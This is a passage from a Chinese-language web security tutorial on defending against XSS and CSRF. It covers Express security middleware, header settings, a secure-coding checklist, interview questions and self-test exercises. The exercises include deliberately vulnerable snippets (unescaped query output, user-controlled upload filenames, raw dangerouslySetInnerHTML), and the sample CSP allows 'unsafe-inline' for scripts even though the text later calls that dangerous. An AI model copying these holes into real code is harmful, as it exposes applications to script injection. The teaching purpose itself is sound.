// --- 防御者视角: 多层防御 ---

// Layer 1: CSP (第一道防线)
// → 内联 onerror 被阻止
// → fetch 到 evil.com 被阻止

// Layer 2: DOMPurify (第二道防线)
// → <img onerror=...> 被清理为 <img>
// → 恶意属性被移除

// Layer 3: HttpOnly Cookie (第三道防线)
// → document.cookie 返回空
// → Session 无法被窃取

// Layer 4: CSRF Token (第四道防线)
// → 即使 Cookie 泄露，无 Token 也无法修改邮箱

// Layer 5: 敏感操作验证 (第五道防线)
// → 修改邮箱需要输入密码确认
// → 即使 CSRF 成功，也需要密码
```

### 5.2 安全中间件 (Express)

```javascript
// ===================== 生产级安全中间件 =====================

const express = require('express');
const helmet = require('helmet'); // 自动设置安全 Header
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

const app = express();

// 1. Helmet: 自动设置安全 Header
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // 按需调整
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  crossOriginEmbedderPolicy: false, // 按需
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xssFilter: true,
  noSniff: true,
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
}));

// 2. 速率限制
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 100, // 最多 100 次请求
  message: '请求过于频繁，请稍后重试',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// 更严格的登录限制
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 次尝试
  message: '登录尝试过多，请 15 分钟后重试',
});
app.post('/api/login', loginLimiter, (req, res) => {
  // 登录逻辑
});

// 3. 请求体大小限制
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ limit: '1mb', extended: false }));

// 4. CSRF 保护
const csrfProtection = (req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const token = req.headers['x-csrf-token'] || req.body._csrf;
  const sessionToken = req.session.csrfToken;

  if (!token || !sessionToken || token !== sessionToken) {
    return res.status(403).json({ error: 'CSRF 验证失败' });
  }

  next();
};
app.use(csrfProtection);

// 5. 安全 Header 补充
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
  next();
});

// 6. 错误处理 (不泄露敏感信息)
app.use((err, req, res, next) => {
  // 生产环境不返回详细错误
  const isDev = process.env.NODE_ENV === 'development';
  res.status(err.status || 500).json({
    error: isDev ? err.message : '服务器内部错误',
    stack: isDev ? err.stack : undefined,
  });
});
```

### 5.3 安全 Header 速查表

```
┌─────────────────────────────────────┬────────────────────────────────┐
│ Header                              │ 作用                           │
├─────────────────────────────────────┼────────────────────────────────┤
│ Content-Security-Policy             │ 控制资源加载来源 (防 XSS)      │
│ X-Content-Type-Options: nosniff     │ 禁止 MIME 类型嗅探             │
│ X-Frame-Options: DENY               │ 禁止 iframe 嵌入               │
│ X-XSS-Protection: 0                 │ 关闭旧版 XSS filter (CSP 更好) │
│ Strict-Transport-Security           │ 强制 HTTPS (HSTS)              │
│ Referrer-Policy                     │ 控制 Referer 信息泄露          │
│ Permissions-Policy                  │ 控制浏览器 API 权限            │
│ Cross-Origin-Opener-Policy          │ 隔离浏览上下文                 │
│ Cross-Origin-Embedder-Policy        │ 限制跨源资源加载               │
│ Cross-Origin-Resource-Policy        │ 控制跨源资源读取               │
└─────────────────────────────────────┴────────────────────────────────┘
```

---

## 6. 安全代码 Checklist <a id="6-checklist"></a>

```
✅ XSS 防御
  [ ] 所有用户输入在输出前经过 HTML 实体编码
  [ ] 使用 textContent 而非 innerHTML
  [ ] 富文本使用 DOMPurify 清理
  [ ] 模板引擎使用自动转义语法
  [ ] URL 参数、Hash 值不直接插入 DOM
  [ ] 属性值中的用户输入也经过编码
  [ ] JavaScript 字符串中的用户输入经过转义

✅ CSRF 防御
  [ ] 所有状态变更请求 (POST/PUT/DELETE) 验证 CSRF Token
  [ ] Cookie 设置 SameSite=Strict 或 Lax
  [ ] API 使用 JSON 格式 (天然防御 CSRF)
  [ ] 敏感操作需要二次验证 (密码/验证码)
  [ ] 登录后重新生成 Session ID

✅ 输入验证
  [ ] 所有输入经过类型/格式/范围验证
  [ ] 使用白名单而非黑名单
  [ ] 文件上传限制类型/大小/存储路径
  [ ] SQL 查询使用参数化 (Prepared Statement)
  [ ] 命令执行使用白名单 + 转义

✅ CSP
  [ ] 设置 Content-Security-Policy 响应头
  [ ] default-src 设为 'self'
  [ ] script-src 不包含 'unsafe-inline' (使用 nonce/hash)
  [ ] object-src 设为 'none'
  [ ] frame-src/frame-ancestors 限制嵌入
  [ ] form-action 限制表单提交目标
  [ ] 使用 Report-Only 模式测试后再启用

✅ 其他安全
  [ ] Cookie 设置 HttpOnly + Secure + SameSite
  [ ] 密码使用 bcrypt/argon2 哈希存储
  [ ] HTTPS 强制 (HSTS)
  [ ] 错误信息不泄露敏感细节
  [ ] API 速率限制
  [ ] 依赖包定期安全审计 (npm audit)
  [ ] 日志记录安全事件 (登录失败/权限变更)
```

---

## 7. 面试高频问题

### Q1: XSS 和 CSRF 的区别？

```
XSS (跨站脚本攻击):
  → 攻击者注入恶意脚本到受害者浏览器执行
  → 利用的是用户对网站的信任
  → 防御: 输入编码 + CSP + DOMPurify

CSRF (跨站请求伪造):
  → 攻击者诱导用户在已登录的网站上执行非预期操作
  → 利用的是网站对用户浏览器的信任
  → 防御: CSRF Token + SameSite Cookie
```

### Q2: 如何防御存储型 XSS？

```
1. 输入端: DOMPurify 清理富文本
2. 存储端: 数据库存储净化后的内容
3. 输出端: HTML 实体编码
4. 传输层: CSP 阻止内联脚本执行
5. Cookie: HttpOnly 防止 Cookie 被窃取
→ 多层防御，任何一层失效其他层仍有效
```

### Q3: CSP 的 'unsafe-inline' 为什么危险？

```
'unsafe-inline' 允许页面执行任何内联 <script> 标签
→ 攻击者注入的 <script>alert(1)</script> 也能执行
→ 完全绕过了 CSP 对脚本的控制

替代方案:
  1. Nonce: script-src 'self' 'nonce-随机值'
  2. Hash: script-src 'self' 'sha256-哈希值'
  3. strict-dynamic: 信任的脚本可动态加载其他脚本
  4. 外部化: 将所有内联脚本移到外部 .js 文件
```

### Q4: SameSite Cookie 的三种模式区别？

```
Strict:  跨站请求完全不发送 Cookie (最安全)
         → 从 evil.com 点击链接到 bank.com，Cookie 不发送

Lax:     GET 跨站导航发送 Cookie，POST 不发送 (平衡)
         → 从 evil.com 点击链接到 bank.com，Cookie 发送
         → 从 evil.com 提交表单到 bank.com，Cookie 不发送

None:    跨站也发送 Cookie (需配合 Secure)
         → 不推荐，除非有明确跨站需求 (如嵌入 iframe)
```

### Q5: 如何安全地处理用户提交的富文本？

```
1. 使用 DOMPurify 清理 HTML
2. 配置白名单: 只允许安全的标签和属性
3. 禁止 javascript: / data: / vbscript: 协议
4. 禁止 onerror / onload 等事件处理器
5. 输出时仍然进行 HTML 实体编码 (双重保险)
6. CSP 作为最后一道防线

示例:
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(?!javascript:|data:)(?:https?:|mailto:)/i,
});
```

---

## 8. 自测题

```javascript
// 1. 以下代码有什么安全问题？如何修复？
// ❌
app.get('/search', (req, res) => {
  res.send(`<h1>搜索结果: ${req.query.q}</h1>`);
});
// ✅ 修复: res.send(`<h1>搜索结果: ${escapeHtml(req.query.q)}</h1>`);

// 2. 以下 CSP 策略有什么问题？
// ❌
// Content-Security-Policy: default-src *; script-src *; style-src *;
// ✅ 修复: 明确指定允许的域名，不使用 *
// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;

// 3. 以下表单有 CSRF 风险吗？
// ❌
// <form action="/api/transfer" method="POST">
//   <input name="to">
//   <input name="amount">
//   <button>转账</button>
// </form>
// ✅ 修复: 添加 CSRF Token
// <input type="hidden" name="_csrf" value="{{csrfToken}}">

// 4. 以下文件上传代码安全吗？
// ❌
// app.post('/upload', (req, res) => {
//   const filename = req.body.filename;
//   req.file.mv(`./public/uploads/${filename}`);
// });
// ✅ 修复: 使用随机文件名 + 白名单验证 + 存储到非公开目录

// 5. 以下 React 组件安全吗？
// ❌
// function UserProfile({ bio }) {
//   return <div dangerouslySetInnerHTML={{ __html: bio }} />;
// }
// ✅ 修复: 使用 DOMPurify 清理
// function UserProfile({ bio }) {
//   return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(bio) }} />;
// }
```

---

## 总结

### 安全核心原则

1. **永不信任用户输入** — 所有输入都是潜在的攻击向量
2. **多层防御** — CSP → 净化 → 编码 → HttpOnly Cookie
3. **最小权限** — 只开放必要的资源访问
4. **纵深防御** — 任何一层失效，其他层仍有效
5. **默认安全** — 安全是默认行为，不是可选项

### 安全编码口诀

```
输入要验证，输出要编码
富文本要净化，Cookie 要 HttpOnly
表单要 Token，跨站要 SameSite
脚本要 CSP，上传要限制
错误不泄露，日志要记录
```

---

_专项训练完成: XSS / CSRF / Sanitization / CSP 完整攻防体系_
_覆盖: 8 种攻击场景 + 15+ 防御方案 + 20+ 代码示例 + 5 道自测题_
